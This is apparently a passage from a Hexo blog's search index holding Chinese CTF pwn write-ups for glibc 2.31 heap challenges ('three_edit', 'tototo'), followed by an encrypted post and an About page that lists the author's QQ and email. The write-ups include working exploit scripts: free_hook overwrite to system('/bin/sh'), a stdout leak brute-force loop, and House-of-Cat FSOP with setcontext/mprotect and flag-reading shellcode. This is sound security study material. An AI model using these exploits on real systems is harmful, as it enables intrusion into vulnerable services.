class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">'a'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,flat([<span class="string">'\x00'</span>*<span class="number">0x28</span>,<span class="number">0x41</span>,free_hook_addr]))</span><br><span class="line"></span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x38</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="three-edit"><a href="#three-edit" class="headerlink" title="three_edit"></a>three_edit</h2><p>glibc2.31堆题,限制了堆块大小0x50-0x70<br>虽然题目叫three_edit,汇编代码中也确实有一个判断,不过是恒成立的所以可以无限edit.<br>看半天愣是没发现洞在哪,edit的时候没有检查idx的正负<br>(其实是关注了一下的,只不过当时看add函数看到idx是个unsigned int就没管了)</p><p>写入小于0的idx使edit的时候能使用tcache_perthread_struct中的指针完成uaf.<br>部分覆写next指针修改size域放进unsortedbin(调整一下堆块的位置就不用爆破一位了),然后切割unsortedbin中的chunk使得unsortedbin chunk的fd指针和某tcache chunk的next指针重合,再次uaf打io_leak.最后劫持free_hook.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">&nbsp; &nbsp; io = remote(url,port)</span><br><span class="line">&nbsp; &nbsp; <span class="comment"># io = process('./'+binary)</span></span><br><span class="line">&nbsp; &nbsp; <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; add(i,<span class="number">0x60</span>,<span class="built_in">str</span>(i))</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">14</span>,<span class="number">0x50</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; </span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">2</span>)</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; edit(-<span class="number">61</span>,<span class="string">b'\x50'</span>)</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; add(<span class="number">12</span>,<span class="number">0x60</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">13</span>,<span class="number">0x60</span>,<span class="string">'\x00'</span>)</span><br><span class="line">&nbsp; &nbsp; edit(<span class="number">1</span>,flat([<span class="string">'\x00'</span>*<span class="number">0x38</span>,<span class="number">0x421</span>]))</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">10</span>)</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">10</span>,<span class="number">0x50</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; add(<span class="number">2</span>,<span class="number">0x70</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">3</span>,<span class="number">0x70</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">11</span>)</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">12</span>)</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">5</span>)</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">13</span>,<span class="number">0x70</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; &nbsp; edit(-<span class="number">61</span>,<span class="string">b'\xa0\x36'</span>)</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; add(<span class="number">11</span>,<span class="number">0x60</span>,<span class="string">'a'</span>)</span><br><span class="line">&nbsp; &nbsp; fake_stdout = flat([</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="number">0xfbad1800</span>,</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="string">b'\x00'</span></span><br><span class="line">&nbsp; &nbsp; ])</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">try</span>:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; add(<span class="number">12</span>,<span class="number">0x60</span>,fake_stdout)</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; io.recv()</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; io.recv(<span class="number">8</span>)</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; stdin = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; leak_libc(<span class="string">'_IO_2_1_stdin_'</span>,stdin)</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hex</span>(libc_base).startswith(<span class="string">"0x7f"</span>):</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; io.close()</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="keyword">continue</span></span><br><span class="line">&nbsp; &nbsp; <span class="keyword">except</span>:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; io.close()</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="keyword">continue</span></span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">10</span>)</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">14</span>)</span><br><span class="line">&nbsp; &nbsp; edit(-<span class="number">62</span>,p64(free_hook_addr))</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">14</span>,<span class="number">0x50</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">10</span>,<span class="number">0x50</span>,p64(system_addr))</span><br><span class="line">  </span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="tototo"><a href="#tototo" class="headerlink" title="tototo"></a>tototo</h2><p>glibc2.31堆题,开了沙箱,程序逻辑感觉有点莫名奇妙的<br>菜单有malloc、edit、show、delete、calloc.<br>malloc范围在0x200-0x800<br>delete只清空了flag位,但是这个位只在delete的时候检查,基本没用<br>edit存在uaf,但是是read(0,chunk_ptr+9,size-0x30),大概就是防止uaf直接改fd吧,edit有3次机会,超出使用调用edit函数.<br>然后有个free_hook的检查,不为0就exit.<br>直接cat就打了…</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x210</span>)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x410</span>)</span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">0x210</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recv()</span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">96</span></span><br><span class="line">leak_libc(<span class="string">'__malloc_hook'</span>,main_arena-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">0xd10</span></span><br><span class="line">log.success(<span class="string">"heap_base is -&gt;"</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,flat([p64(main_arena+<span class="number">1104</span>)[<span class="number">1</span>:],<span class="number">0</span>,io_list_all-<span class="number">0x20</span>]))</span><br><span class="line">malloc(<span class="number">4</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">fake_io_addr = heap_base+<span class="number">0x8e0</span></span><br><span class="line">cat = <span class="string">b'\x00'</span>*<span class="number">7</span></span><br><span class="line">cat+=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">cat +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">cat +=p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">cat +=p64(setcontext_addr+<span class="number">61</span>)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">cat = cat.ljust(<span class="number">0x4f</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">cat += p64(<span class="number">0</span>) &nbsp;<span class="comment"># _chain</span></span><br><span class="line">cat = cat.ljust(<span class="number">0x6f</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">cat += p64(heap_base+<span class="number">0x1000</span>) &nbsp;<span class="comment"># _lock = a writable address</span></span><br><span class="line">cat = cat.ljust(<span class="number">0x87</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">cat +=p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">cat = cat.ljust(<span class="number">0xa7</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">cat += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">cat = cat.ljust(<span class="number">0xbf</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">cat += p64(libc_base+libc.sym[<span class="string">'_IO_wfile_jumps'</span>]+<span class="number">0x30</span>) &nbsp;<span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">cat +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">cat += p64(fake_io_addr+<span class="number">0x40</span>) &nbsp;<span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">frame = flat([heap_base,<span class="number">0x2000</span>,<span class="string">'\x00'</span>*<span class="number">0x10</span>,<span class="number">7</span>,<span class="string">'\x00'</span>*<span class="number">0x10</span>,fake_io_addr+<span class="number">0x160</span>,mprotect_addr])</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; push 0x67616c66</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; mov rdi,rsp</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; xor esi,esi</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; push 2</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; pop rax</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; syscall</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; mov rdi,rax</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; mov rsi,rsp</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; mov edx,0x100</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; xor eax,eax</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; syscall</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; mov edi,1</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; push 1</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; pop rax</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; syscall</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,cat+frame+p64(fake_io_addr+<span class="number">0x168</span>)+shellcode)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'is:'</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="kheap"><a href="#kheap" class="headerlink" title="kheap"></a>kheap</h2><p>好像是kernel的题,以后回来复现了…</p>]]></content>
      
      
      <categories>
          
          <category> ctf复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一生所爱</title>
      <link href="/2022/Flower-of-Love/"/>
      <url>/2022/Flower-of-Love/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9145a3286f09fd9c07eed3109be9b7f029715ea34ef175f02ce30b9ebe07d55e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">特定的人,特定的时间</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/2022/About/"/>
      <url>/2022/About/</url>
      
        <content type="html"><![CDATA[<p>翰青HanQi,北极落小雪,Polaris_Snowfall</p><span id="more"></span><h2 id="关于现状"><a href="#关于现状" class="headerlink" title="关于现状"></a>关于现状</h2><p>北京邮电大学网络空间安全专业大二在读<br>天璇Merak Pwn手<br>对二进制安全感兴趣,目前还在计算机基础学习中…</p><h2 id="关于未来"><a href="#关于未来" class="headerlink" title="关于未来"></a>关于未来</h2><p>以后的工作可能是车联网,内核,虚拟化的安全或者开发吧(送外卖也是有可能的…)<br>渗透方面的东西也是想学的</p><h2 id="关于爱好"><a href="#关于爱好" class="headerlink" title="关于爱好"></a>关于爱好</h2><p>maybe 音乐,散步,发呆,看世界.<br>(<del>理解机制的实现并通过其实现来解释现象?不局限于计算机,包括生物化学之类的</del></p><h2 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h2><p>如本站内容有误,请联系我修改.<br>QQ: 811614792<br>邮箱: <a href="mailto:811614792@qq.com">811614792@qq.com</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
